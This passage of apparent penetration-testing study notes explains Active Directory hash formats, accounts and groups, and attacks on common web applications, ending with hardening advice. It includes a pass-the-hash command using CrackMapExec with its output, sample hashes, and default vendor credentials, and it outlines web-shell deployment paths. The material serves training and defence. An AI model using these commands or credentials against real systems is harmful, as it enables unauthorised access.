Authentication Message Type Trusted Third Party NTLM Symmetric key cryptography No Random number Domain Controller NTLMv1 Symmetric key cryptography No MD4 hash, random number Domain Controller NTLMv2 Symmetric key cryptography No MD4 hash, random number Domain Controller Kerberos Symmetric key cryptography & asymmetric cryptography Yes Encrypted ticket using DES, MD5 Domain Controller,/Key Distribution Center (KDC)","title":"Hash Protocol Comparison"},{"location":"active_directory/ad_protocols/#lm","text":"LAN Manager (LM) hashes are the oldest password storage mechanism used by the Windows operating system. LM debuted in 1987 on the OS/2 operating system. If in use, they are stored in the SAM database on a Windows host and the NTDS.DIT database on a Domain Controller. Due to significant security weaknesses in the hashing algorithm used for LM hashes, it has been turned off by default since Windows Vista/Server 2008. However, it is still common to encounter, especially in large environments where older systems are still used. Passwords using LM are limited to a maximum of 14 characters. Passwords are not case sensitive and are converted to uppercase before generating the hashed value, limiting the keyspace to a total of 69 characters making it relatively easy to crack these hashes using a tool such as Hashcat. Before hashing, a 14 character password is first split into two seven-character chunks. If the password is less than fourteen characters, it will be padded with NULL characters to reach the correct value. Two DES keys are created from each chunk. These chunks are then encrypted using the string KGS!@#$% , creating two 8-byte ciphertext values. These two values are then concatenated together, resulting in an LM hash. This hashing algorithm means that an attacker only needs to brute force seven characters twice instead of the entire fourteen characters, making it fast to crack LM hashes on a system with one or more GPUs. If a password is seven characters or less, the second half of the LM hash will always be the same value and could even be determined visually without even needed tools such as Hashcat. The use of LM hashes can be disallowed using Group Policy . An LM hash takes the form of 299bd128c1101fd6 .","title":"LM"},{"location":"active_directory/ad_protocols/#nthash-ntlm","text":"NT LAN Manager (NTLM) hashes are used on modern Windows systems. It is a challenge-response authentication protocol and uses three messages to authenticate: a client first sends a NEGOTIATE_MESSAGE to the server, whose response is a CHALLENGE_MESSAGE to verify the client's identity. Lastly, the client responds with an AUTHENTICATE_MESSAGE . These hashes are stored locally in the SAM database or the NTDS.DIT database file on a Domain Controller. The protocol has two hashed password values to choose from to perform authentication: the LM hash (as discussed above) and the NT hash, which is the MD4 hash of the little-endian UTF-16 value of the password. The algorithm can be visualized as: MD4(UTF-16-LE(password)) . Even though they are considerably stronger than LM hashes (supporting the entire Unicode character set of 65,536 characters), they can still be brute-forced offline relatively quickly using a tool such as Hashcat. GPU attacks have shown that the entire NTLM 8 character keyspace can be brute-forced in under 3 hours . Longer NTLM hashes can be more challenging to crack depending on the password chosen, and even long passwords (15+ characters) can be cracked using an offline dictionary attack combined with rules. NTLM is also vulnerable to the pass-the-hash attack, which means an attacker can use just the NTLM hash (after obtaining via another successful attack) to authenticate to target systems where the user is a local admin without needing to know the cleartext value of the password. An NT hash takes the form of b4b9b02e6f09a9bd760f388b67351e2b , which is the second half of the full NTLM hash. An NTLM hash looks like this: NTLM Authentication Request Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2::: We can break the HTLM hash down into its individual parts: Rachel is the username 500 is the Relative Identifier (RID). 500 is the known RID for the administrator account aad3c435b514a4eeaad3b935b51304fe is the LM hash and, if LM hashes are disabled on the system, can not be used for anything e46b9e548fa0d122de7f59fb6d48eaa2 is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack. Below is an example of a successful pass-the-hash attack using the CrackMapExec tool: hrmns@htb[/htb]$ crackmapexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2 SMB 10.129.43.9 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 10.129.43.9 445 DC01 [+] INLANEFREIGHT.LOCAL\\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!)","title":"NTHash (NTLM)"},{"location":"active_directory/ad_protocols/#ntlmv1-net-ntmlv1","text":"The NTLM protocol performs a challenge/response between a server and client using the NT hash. NTLMv1 uses both the NT and the LM hash, which can make it easier to \"crack\" offline after capturing a hash using a tool such as Responder or via an NTLM relay attack . NTLMv1 Hash Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c NTLMv1 was the building block for modern NTLM authentication. Like any protocol, it has flaws and is susceptible to cracking and other attacks.","title":"NTLMv1 (Net-NTMLv1)"},{"location":"active_directory/ad_protocols/#ntlmv2-net-ntlmv2","text":"The NTLMv2 protocol was first introduced in Windows NT 4.0 SP4 and was created as a stronger alternative to NTLMv1. It has been the default in Windows since Server 2000. It is hardened against certain spoofing attacks that NTLMv1 is susceptible to. NTLMv2 sends two responses to the 8-byte challenge received by the server. These responses contain a 16-byte HMAC-MD5 hash of the challenge, a randomly generated challenge from the client, and an HMAC-MD5 hash of the user's credentials. A second response is sent, using a variable-length client challenge including the current time, an 8-byte random value, and the domain name. NTLMv2 Hash Example admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 Developers improved upon v1 by making NTLMv2 harder to crack and giving it a more robust algorithm made up of multiple stages.","title":"NTLMv2 (Net-NTLMv2)"},{"location":"active_directory/ad_protocols/#domain-cached-credentials-mscache2","text":"In an AD environment, the authentication methods mentioned in this section and the previous require the host we are trying to access to communicate with the \"brains\" of the network, the Domain Controller. Microsoft developed the MS Cache v1 and v2 algorithm (also known as Domain Cached Credentials (DCC) to solve the potential issue of a domain-joined host being unable to communicate with a domain controller (i.e., due to a network outage or other technical issue) and, hence, NTLM/Kerberos authentication not working to access the host in question. Hosts save the last ten hashes for any domain users that successfully log into the machine in the HKEY_LOCAL_MACHINE\\SECURITY\\Cache registry key. These hashes cannot be used in pass-the-hash attacks. Furthermore, the hash is very slow to crack with a tool such as Hashcat, even when using an extremely powerful GPU cracking rig, so attempts to crack these hashes typically need to be extremely targeted or rely on a very weak password in use. These hashes can be obtained by an attacker or pentester after gaining local admin access to a host and have the following format: $DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9c90f . It is vital as penetration testers that we understand the varying types of hashes that we may encounter while assessing an AD environment, their strengths, weaknesses, how they can be abused (cracking to cleartext, pass-the-hash, or relayed), and when an attack may be futile (i.e., spending days attempting to crack a set of Domain Cached Credentials).","title":"Domain Cached Credentials (MSCache2)"},{"location":"active_directory/ad_users/","text":"User and Machine Accounts \u00b6 User accounts are created on both local systems (not joined to AD) and in Active Directory to give a person or a program (such as a system service) the ability to log on to a computer and access resources based on their rights. When a user logs in, the system verifies their password and creates an access token. This token describes the security content of a process or thread and includes the user's security identity and group membership. Whenever a user interacts with a process, this token is presented. User accounts are used to allow employees/contractors to log in to a computer and access resources, to run programs or services under a specific security context (i.e., running as a highly privileged user instead of a network service account), and to manage access to objects and their properties such as network file shares, files, applications, etc. Users can be assigned to groups that can contain one or more members. These groups can also be used to control access to resources. It can be easier for an administrator to assign privileges once to a group (which all group members inherit) instead of many times to each individual user. This helps simplify administration and makes it easier to grant and revoke user rights. The ability to provision and manage user accounts is one of the core elements of Active Directory. Typically, every company we encounter will have at least one AD user account provisioned per user. Some users may have two or more accounts provisioned based on their job role (i.e., an IT admin or Help Desk member). Aside from standard user and admin accounts tied back to a specific user, we will often see many service accounts used to run a particular application or service in the background or perform other vital functions within the domain environment. An organization with 1,000 employees could have 1,200 active user accounts or more! We may also see organizations with hundreds of disabled accounts from former employees, temporary/seasonal employees, interns, etc. Some companies must retain records of these accounts for audit purposes, so they will deactivate them (and hopefully remove all privileges) once the employee is terminated, but they will not delete them. It is common to see an OU such as FORMER EMPLOYEES that will contain many deactivated accounts. Local Accounts \u00b6 Local accounts are stored locally on a particular server or workstation. These accounts can be assigned rights on that host either individually or via group membership. Any rights assigned can only be granted to that specific host and will not work across the domain. Local user accounts are considered security principals but can only manage access to and secure resources on a standalone host. There are several default local user accounts that are created on a Windows system: Administrator : this account has the SID S-1-5-domain-500 and is the first account created with a new Windows installation. It has full control over almost every resource on the system. It cannot be deleted or locked, but it can be disabled or renamed. Windows 10 and Server 2016 hosts disable the built-in administrator account by default and create another local account in the local administrator's group during setup. Guest : this account is disabled by default. The purpose of this account is to allow users without an account on the computer to log in temporarily with limited access rights. By default, it has a blank password and is generally recommended to be left disabled because of the security risk of allowing anonymous access to a host. SYSTEM : The SYSTEM (or NT AUTHORITY\\SYSTEM ) account on a Windows host is the default account installed and used by the operating system to perform many of its internal functions. Unlike the Root account on Linux, SYSTEM is a service account and does not run entirely in the same context as a regular user. Many of the processes and services running on a host are run under the SYSTEM context. One thing to note with this account is that a profile for it does not exist, but it will have permissions over most everything on the host. It does not appear in User Manager and cannot be added to any groups. A SYSTEM account is the highest permission level one can achieve on a Windows host and, by default, is granted Full Control permissions to all files on a Windows system. Network Service : This is a predefined local account used by the Service Control Manager (SCM) for running Windows services. When a service runs in the context of this particular account, it will present credentials to remote services. Local Service : This is another predefined local account used by the Service Control Manager (SCM) for running Windows services. It is configured with minimal privileges on the computer and presents anonymous credentials to the network. Domain Users \u00b6 Domain users differ from local users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on the permissions granted to their user account or the group that account is a member of. Domain user accounts can log in to any host in the domain, unlike local users. For more information on the many different Active Directory account types, check out this link . One account to keep in mind is the KRBTGT account, however. This is a type of local account built into the AD infrastructure. This account acts as a service account for the Key Distribution service providing authentication and access for domain resources. This account is a common target of many attackers since gaining control or access will enable an attacker to have unconstrained access to the domain. It can be leveraged for privilege escalation and persistence in a domain through attacks such as the Golden Ticket attack. User Naming Attributes \u00b6 Security in Active Directory can be improved using a set of user naming attributes to help identify user objects like logon name or ID. The following are a few important Naming Attributes in AD: UserPrincipalName (UPN) This is the primary logon name for the user. By convention, the UPN uses the email address of the user. ObjectGUID This is a unique identifier of the user. In AD, the ObjectGUID attribute name never changes and remains unique even if the user is removed. SAMAccountName This is a logon name that supports the previous version of Windows clients and servers. objectSID The user's Security Identifier (SID). This attribute identifies a user and its group memberships during security interactions with the server. sIDHistory This contains previous SIDs for the user object if moved from another domain and is typically seen in migration scenarios from domain to domain. After a migration occurs, the last SID will be added to the sIDHistory property, and the new SID will become its objectSID . Common User Atttributes PS C:\\htb Get-ADUser -Identity htb-student DistinguishedName : CN=htb student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Enabled : True GivenName : htb Name : htb student ObjectClass : user ObjectGUID : aa799587-c641-4c23-a2f7-75850b4dd7e3 SamAccountName : htb-student SID : S-1-5-21-3842939050-3880317879-2865463114-1111 Surname : student UserPrincipalName : htb-student@INLANEFREIGHT.LOCAL Domain-joined vs. Non-Domain-joined Machines \u00b6 Domain joined Hosts joined to a domain have greater ease of information sharing within the enterprise and a central management point (the DC) to gather resources, policies, and updates from. A host joined to a domain will acquire any configurations or changes necessary through the domain's Group Policy. The benefit here is that a user in the domain can log in and access resources from any host joined to the domain, not just the one they work on. This is the typical setup you will see in enterprise environments. Non-domain joined Non-domain joined computers or computers in a workgroup are not managed by domain policy. With that in mind, sharing resources outside your local network is much more complicated than it would be on a domain. This is fine for computers meant for home use or small business clusters on the same LAN. The advantage of this setup is that the individual users are in charge of any changes they wish to make to their host. Any user accounts on a workgroup computer only exist on that host, and profiles are not migrated to other hosts within the workgroup. It is important to note that a machine account ( NT AUTHORITY\\SYSTEM level access) in an AD environment will have most of the same rights as a standard domain user account. This is important because we do not always need to obtain a set of valid credentials for an individual user's account to begin enumerating and attacking a domain. Active Directory Groups \u00b6 After users, groups are another significant object in Active Directory. They can place similar users together and mass assign rights and access. Groups are another key target for attackers and penetration testers, as the rights that they confer on their members may not be readily apparent but may grant excessive (and even unintended) privileges that can be abused if not set up correctly. Types of Groups \u00b6 Groups in Active Directory have two fundamental characteristics: type and scope . The group type defines the group's purpose, while the group scope shows how the group can be used within the domain or forest. When creating a new group, we must select a group type. There are two main types: security and distribution groups. Group Type And Scope The Security groups type is primarily for ease of assigning permissions and rights to a collection of users instead of one at a time. They simplify management and reduce overhead when assigning permissions and rights for a given resource. All users added to a security group will inherit any permissions assigned to the group, making it easier to move users in and out of groups while leaving the group's permissions unchanged. The Distribution groups type is used by email applications such as Microsoft Exchange to distribute messages to group members. They function much like mailing lists and allow for auto-adding emails in the \"To\" field when creating an email in Microsoft Outlook. This type of group cannot be used to assign permissions to resources in a domain environment. Group Scopes \u00b6 There are three different group scopes that can be assigned when creating a new group. Domain Local Group Global Group Universal Group Domain Local Group Domain local groups can only be used to manage permissions to domain resources in the domain where it was created. Local groups cannot be used in other domains but CAN contain users from OTHER domains. Local groups can be nested into (contained within) other local groups but NOT within global groups. Global Groups Global groups can be used to grant access to resources in another domain . A global group can only contain accounts from the domain where it was created. Global groups can be added to both other global groups and local groups. Universal Group The universal group scope can be used to manage resources distributed across multiple domains and can be given permissions to any object within the same forest . They are available to all domains within an organization and can contain users from any domain. Unlike domain local and global groups, universal groups are stored in the Global Catalog (GC), and adding or removing objects from a universal group triggers forest-wide replication. It is recommended that administrators maintain other groups (such as global groups) as members of universal groups because global group membership within universal groups is less likely to change than individual user membership in global groups. Replication is only triggered at the individual domain level when a user is removed from a global group. If individual users and computers (instead of global groups) are maintained within universal groups, it will trigger forest-wide replication each time a change is made. This can create a lot of network overhead and potential for issues. AD Group Scope Examples PS C:\\htb> Get-ADGroup -Filter * |select samaccountname,groupscope samaccountname groupscope -------------- ---------- Administrators DomainLocal Users DomainLocal Guests DomainLocal Print Operators DomainLocal Backup Operators DomainLocal Replicator DomainLocal Remote Desktop Users DomainLocal Network Configuration Operators DomainLocal Distributed COM Users DomainLocal IIS_IUSRS DomainLocal Cryptographic Operators DomainLocal Event Log Readers DomainLocal Certificate Service DCOM Access DomainLocal RDS Remote Access Servers DomainLocal RDS Endpoint Servers DomainLocal RDS Management Servers DomainLocal Hyper-V Administrators DomainLocal Access Control Assistance Operators DomainLocal Remote Management Users DomainLocal Storage Replica Administrators DomainLocal Domain Computers Global Domain Controllers Global Schema Admins Universal Enterprise Admins Universal Cert Publishers DomainLocal Domain Admins Global Domain Users Global Domain Guests Global <SNIP> Group Scopes can be changed, but there are a few caveats: A Global Group can only be converted to a Universal Group if it is NOT part of another Global Group. A Domain Local Group can only be converted to a Universal Group if the Domain Local Group does NOT contain any other Domain Local Groups as members. A Universal Group can be converted to a Domain Local Group without any restrictions. A Universal Group can only be converted to a Global Group if it does NOT contain any other Universal Groups as members. Built-in vs. Custom Groups \u00b6 Several built-in security groups are created with a Domain Local Group scope when a domain is created. These groups are used for specific administrative purposes and are discussed more in the next section. It is important to note that only user accounts can be added to these built-in groups as they do not allow for group nesting (groups within groups). Some examples of built-in groups included Domain Admins , which is a Global security group and can only contain accounts from its own domain. If an organization wants to allow an account from domain B to perform administrative functions on a domain controller in domain A, the account would have to be added to the built-in Administrators group, which is a Domain Local group. Nested Group Membership \u00b6 Nested group membership is an important concept in AD. As mentioned previously, a Domain Local Group can be a member of another Domain Local Group in the same domain. Through this membership, a user may inherit privileges not assigned directly to their account or even the group they are directly a member of, but rather the group that their group is a member of. This can sometimes lead to unintended privileges granted to a user that are difficult to uncover without an in-depth assessment of the domain. Though DCorner is not a direct member of Helpdesk Level 1 , their membership in Help Desk grants them the same privileges that any member of Helpdesk Level 1 has. In this case, the privilege would allow them to add a member to the Tier 1 Admins group ( GenericWrite ). If this group confers any elevated privileges in the domain, it would likely be a key target for a penetration tester. Here, we could add our user to the group and obtain privileges that members of the Tier 1 Admins group are granted, such as local administrator access to one or more hosts that could be used to further access. Nested Groups via Bloodhound Important Group Attributes \u00b6 Some of the most important group attributes include: cn : The cn or Common-Name is the name of the group in Active Directory Domain Services. member : Which user, group, and contact objects are members of the group. groupType : An integer that specifies the group type and scope. memberOf : A listing of any groups that contain the group as a member (nested group membership). objectSid : This is the security identifier or SID of the group, which is the unique value used to identify the group as a security principal. Groups are fundamental objects in AD that can be used to group other objects together and facilitate the management of rights and access.","title":"All About Users"},{"location":"active_directory/ad_users/#user-and-machine-accounts","text":"User accounts are created on both local systems (not joined to AD) and in Active Directory to give a person or a program (such as a system service) the ability to log on to a computer and access resources based on their rights. When a user logs in, the system verifies their password and creates an access token. This token describes the security content of a process or thread and includes the user's security identity and group membership. Whenever a user interacts with a process, this token is presented. User accounts are used to allow employees/contractors to log in to a computer and access resources, to run programs or services under a specific security context (i.e., running as a highly privileged user instead of a network service account), and to manage access to objects and their properties such as network file shares, files, applications, etc. Users can be assigned to groups that can contain one or more members. These groups can also be used to control access to resources. It can be easier for an administrator to assign privileges once to a group (which all group members inherit) instead of many times to each individual user. This helps simplify administration and makes it easier to grant and revoke user rights. The ability to provision and manage user accounts is one of the core elements of Active Directory. Typically, every company we encounter will have at least one AD user account provisioned per user. Some users may have two or more accounts provisioned based on their job role (i.e., an IT admin or Help Desk member). Aside from standard user and admin accounts tied back to a specific user, we will often see many service accounts used to run a particular application or service in the background or perform other vital functions within the domain environment. An organization with 1,000 employees could have 1,200 active user accounts or more! We may also see organizations with hundreds of disabled accounts from former employees, temporary/seasonal employees, interns, etc. Some companies must retain records of these accounts for audit purposes, so they will deactivate them (and hopefully remove all privileges) once the employee is terminated, but they will not delete them. It is common to see an OU such as FORMER EMPLOYEES that will contain many deactivated accounts.","title":"User and Machine Accounts"},{"location":"active_directory/ad_users/#local-accounts","text":"Local accounts are stored locally on a particular server or workstation. These accounts can be assigned rights on that host either individually or via group membership. Any rights assigned can only be granted to that specific host and will not work across the domain. Local user accounts are considered security principals but can only manage access to and secure resources on a standalone host. There are several default local user accounts that are created on a Windows system: Administrator : this account has the SID S-1-5-domain-500 and is the first account created with a new Windows installation. It has full control over almost every resource on the system. It cannot be deleted or locked, but it can be disabled or renamed. Windows 10 and Server 2016 hosts disable the built-in administrator account by default and create another local account in the local administrator's group during setup. Guest : this account is disabled by default. The purpose of this account is to allow users without an account on the computer to log in temporarily with limited access rights. By default, it has a blank password and is generally recommended to be left disabled because of the security risk of allowing anonymous access to a host. SYSTEM : The SYSTEM (or NT AUTHORITY\\SYSTEM ) account on a Windows host is the default account installed and used by the operating system to perform many of its internal functions. Unlike the Root account on Linux, SYSTEM is a service account and does not run entirely in the same context as a regular user. Many of the processes and services running on a host are run under the SYSTEM context. One thing to note with this account is that a profile for it does not exist, but it will have permissions over most everything on the host. It does not appear in User Manager and cannot be added to any groups. A SYSTEM account is the highest permission level one can achieve on a Windows host and, by default, is granted Full Control permissions to all files on a Windows system. Network Service : This is a predefined local account used by the Service Control Manager (SCM) for running Windows services. When a service runs in the context of this particular account, it will present credentials to remote services. Local Service : This is another predefined local account used by the Service Control Manager (SCM) for running Windows services. It is configured with minimal privileges on the computer and presents anonymous credentials to the network.","title":"Local Accounts"},{"location":"active_directory/ad_users/#domain-users","text":"Domain users differ from local users in that they are granted rights from the domain to access resources such as file servers, printers, intranet hosts, and other objects based on the permissions granted to their user account or the group that account is a member of. Domain user accounts can log in to any host in the domain, unlike local users. For more information on the many different Active Directory account types, check out this link . One account to keep in mind is the KRBTGT account, however. This is a type of local account built into the AD infrastructure. This account acts as a service account for the Key Distribution service providing authentication and access for domain resources. This account is a common target of many attackers since gaining control or access will enable an attacker to have unconstrained access to the domain. It can be leveraged for privilege escalation and persistence in a domain through attacks such as the Golden Ticket attack.","title":"Domain Users"},{"location":"active_directory/ad_users/#user-naming-attributes","text":"Security in Active Directory can be improved using a set of user naming attributes to help identify user objects like logon name or ID. The following are a few important Naming Attributes in AD: UserPrincipalName (UPN) This is the primary logon name for the user. By convention, the UPN uses the email address of the user. ObjectGUID This is a unique identifier of the user. In AD, the ObjectGUID attribute name never changes and remains unique even if the user is removed. SAMAccountName This is a logon name that supports the previous version of Windows clients and servers. objectSID The user's Security Identifier (SID). This attribute identifies a user and its group memberships during security interactions with the server. sIDHistory This contains previous SIDs for the user object if moved from another domain and is typically seen in migration scenarios from domain to domain. After a migration occurs, the last SID will be added to the sIDHistory property, and the new SID will become its objectSID . Common User Atttributes PS C:\\htb Get-ADUser -Identity htb-student DistinguishedName : CN=htb student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL Enabled : True GivenName : htb Name : htb student ObjectClass : user ObjectGUID : aa799587-c641-4c23-a2f7-75850b4dd7e3 SamAccountName : htb-student SID : S-1-5-21-3842939050-3880317879-2865463114-1111 Surname : student UserPrincipalName : htb-student@INLANEFREIGHT.LOCAL","title":"User Naming Attributes"},{"location":"active_directory/ad_users/#domain-joined-vs-non-domain-joined-machines","text":"Domain joined Hosts joined to a domain have greater ease of information sharing within the enterprise and a central management point (the DC) to gather resources, policies, and updates from. A host joined to a domain will acquire any configurations or changes necessary through the domain's Group Policy. The benefit here is that a user in the domain can log in and access resources from any host joined to the domain, not just the one they work on. This is the typical setup you will see in enterprise environments. Non-domain joined Non-domain joined computers or computers in a workgroup are not managed by domain policy. With that in mind, sharing resources outside your local network is much more complicated than it would be on a domain. This is fine for computers meant for home use or small business clusters on the same LAN. The advantage of this setup is that the individual users are in charge of any changes they wish to make to their host. Any user accounts on a workgroup computer only exist on that host, and profiles are not migrated to other hosts within the workgroup. It is important to note that a machine account ( NT AUTHORITY\\SYSTEM level access) in an AD environment will have most of the same rights as a standard domain user account. This is important because we do not always need to obtain a set of valid credentials for an individual user's account to begin enumerating and attacking a domain.","title":"Domain-joined vs. Non-Domain-joined Machines"},{"location":"active_directory/ad_users/#active-directory-groups","text":"After users, groups are another significant object in Active Directory. They can place similar users together and mass assign rights and access. Groups are another key target for attackers and penetration testers, as the rights that they confer on their members may not be readily apparent but may grant excessive (and even unintended) privileges that can be abused if not set up correctly.","title":"Active Directory Groups"},{"location":"active_directory/ad_users/#types-of-groups","text":"Groups in Active Directory have two fundamental characteristics: type and scope . The group type defines the group's purpose, while the group scope shows how the group can be used within the domain or forest. When creating a new group, we must select a group type. There are two main types: security and distribution groups. Group Type And Scope The Security groups type is primarily for ease of assigning permissions and rights to a collection of users instead of one at a time. They simplify management and reduce overhead when assigning permissions and rights for a given resource. All users added to a security group will inherit any permissions assigned to the group, making it easier to move users in and out of groups while leaving the group's permissions unchanged. The Distribution groups type is used by email applications such as Microsoft Exchange to distribute messages to group members. They function much like mailing lists and allow for auto-adding emails in the \"To\" field when creating an email in Microsoft Outlook. This type of group cannot be used to assign permissions to resources in a domain environment.","title":"Types of Groups"},{"location":"active_directory/ad_users/#group-scopes","text":"There are three different group scopes that can be assigned when creating a new group. Domain Local Group Global Group Universal Group Domain Local Group Domain local groups can only be used to manage permissions to domain resources in the domain where it was created. Local groups cannot be used in other domains but CAN contain users from OTHER domains. Local groups can be nested into (contained within) other local groups but NOT within global groups. Global Groups Global groups can be used to grant access to resources in another domain . A global group can only contain accounts from the domain where it was created. Global groups can be added to both other global groups and local groups. Universal Group The universal group scope can be used to manage resources distributed across multiple domains and can be given permissions to any object within the same forest . They are available to all domains within an organization and can contain users from any domain. Unlike domain local and global groups, universal groups are stored in the Global Catalog (GC), and adding or removing objects from a universal group triggers forest-wide replication. It is recommended that administrators maintain other groups (such as global groups) as members of universal groups because global group membership within universal groups is less likely to change than individual user membership in global groups. Replication is only triggered at the individual domain level when a user is removed from a global group. If individual users and computers (instead of global groups) are maintained within universal groups, it will trigger forest-wide replication each time a change is made. This can create a lot of network overhead and potential for issues. AD Group Scope Examples PS C:\\htb> Get-ADGroup -Filter * |select samaccountname,groupscope samaccountname groupscope -------------- ---------- Administrators DomainLocal Users DomainLocal Guests DomainLocal Print Operators DomainLocal Backup Operators DomainLocal Replicator DomainLocal Remote Desktop Users DomainLocal Network Configuration Operators DomainLocal Distributed COM Users DomainLocal IIS_IUSRS DomainLocal Cryptographic Operators DomainLocal Event Log Readers DomainLocal Certificate Service DCOM Access DomainLocal RDS Remote Access Servers DomainLocal RDS Endpoint Servers DomainLocal RDS Management Servers DomainLocal Hyper-V Administrators DomainLocal Access Control Assistance Operators DomainLocal Remote Management Users DomainLocal Storage Replica Administrators DomainLocal Domain Computers Global Domain Controllers Global Schema Admins Universal Enterprise Admins Universal Cert Publishers DomainLocal Domain Admins Global Domain Users Global Domain Guests Global <SNIP> Group Scopes can be changed, but there are a few caveats: A Global Group can only be converted to a Universal Group if it is NOT part of another Global Group. A Domain Local Group can only be converted to a Universal Group if the Domain Local Group does NOT contain any other Domain Local Groups as members. A Universal Group can be converted to a Domain Local Group without any restrictions. A Universal Group can only be converted to a Global Group if it does NOT contain any other Universal Groups as members.","title":"Group Scopes"},{"location":"active_directory/ad_users/#built-in-vs-custom-groups","text":"Several built-in security groups are created with a Domain Local Group scope when a domain is created. These groups are used for specific administrative purposes and are discussed more in the next section. It is important to note that only user accounts can be added to these built-in groups as they do not allow for group nesting (groups within groups). Some examples of built-in groups included Domain Admins , which is a Global security group and can only contain accounts from its own domain. If an organization wants to allow an account from domain B to perform administrative functions on a domain controller in domain A, the account would have to be added to the built-in Administrators group, which is a Domain Local group.","title":"Built-in vs. Custom Groups"},{"location":"active_directory/ad_users/#nested-group-membership","text":"Nested group membership is an important concept in AD. As mentioned previously, a Domain Local Group can be a member of another Domain Local Group in the same domain. Through this membership, a user may inherit privileges not assigned directly to their account or even the group they are directly a member of, but rather the group that their group is a member of. This can sometimes lead to unintended privileges granted to a user that are difficult to uncover without an in-depth assessment of the domain. Though DCorner is not a direct member of Helpdesk Level 1 , their membership in Help Desk grants them the same privileges that any member of Helpdesk Level 1 has. In this case, the privilege would allow them to add a member to the Tier 1 Admins group ( GenericWrite ). If this group confers any elevated privileges in the domain, it would likely be a key target for a penetration tester. Here, we could add our user to the group and obtain privileges that members of the Tier 1 Admins group are granted, such as local administrator access to one or more hosts that could be used to further access. Nested Groups via Bloodhound","title":"Nested Group Membership"},{"location":"active_directory/ad_users/#important-group-attributes","text":"Some of the most important group attributes include: cn : The cn or Common-Name is the name of the group in Active Directory Domain Services. member : Which user, group, and contact objects are members of the group. groupType : An integer that specifies the group type and scope. memberOf : A listing of any groups that contain the group as a member (nested group membership). objectSid : This is the security identifier or SID of the group, which is the unique value used to identify the group as a security principal. Groups are fundamental objects in AD that can be used to group other objects together and facilitate the management of rights and access.","title":"Important Group Attributes"},{"location":"attacking_common_apps/closing_out/","text":"Other Notable Applications \u00b6 A big part of penetration testing is adapting to the unknown. Some testers may run a few scans and become discouraged when they don't see anything directly exploitable. If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios. Honorable Mentions \u00b6 Application Abuse Info Axis2 This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a webshell in the form of an AAR file (Axis2 service file). There is also a Metasploit module that can assist with this. Websphere Websphere has suffered from many different vulnerabilities over the years. Furthermore, if we can log in to the administrative console with default credentials such as system:manager we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell. Elasticsearch Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen this before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine Haystack features Elasticsearch. Zabbix Zabbix is an open-source system and network monitoring solution that has had quite a few vulnerabilities discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box Zipper showcases how to use the Zabbix API to gain RCE. Nagios Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials nagiosadmin:PASSW0RD and fingerprinting the version. WebLogic WebLogic is a Java EE application server. At the time of writing, it has 190 reported CVEs . There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities. Wikis/Intranets We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials. DotNetNuke DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe issues over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download. vCenter vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this Apache Struts 2 RCE that scanners like Nessus do not pick up. This unauthenticated OVA file upload vulnerability was disclosed in early 2021, and a PoC for CVE-2021-22005 was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise. Appilcation Hardening \u00b6 The first step for any organization should be to create a detailed (and accurate) application inventory of both internal and external-facing applications. This can be achieved in many ways, and blue teams on a budget could benefit from pentesting tools such as Nmap and EyeWitness to assist in the process. Various open-source and paid tools can be used to create and maintain this inventory. Without knowing what exists in the environment, we won't know what to protect! Creating this inventory may expose instances of \"shadow IT\" (or unauthorized installs), deprecated applications that are no longer needed, or even issues such as a trial version of a tool being converted to a free version automatically (such as Splunk when it no longer requires authentication). General Hardening Tips \u00b6 Secure authentication : Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed. If possible, the default administrative accounts should be disabled, with new custom administrative accounts created. Some applications inherently support 2FA authentication, which should be made mandatory for at least administrator-level users. Access controls : Proper access control mechanisms should be implemented per application. For example, login pages should not be accessible from the external network unless there is a valid business reason for this access. Similarly, file and folder permissions can be configured to deny uploads or application deployments. Disable unsafe features : Features such as PHP code editing in 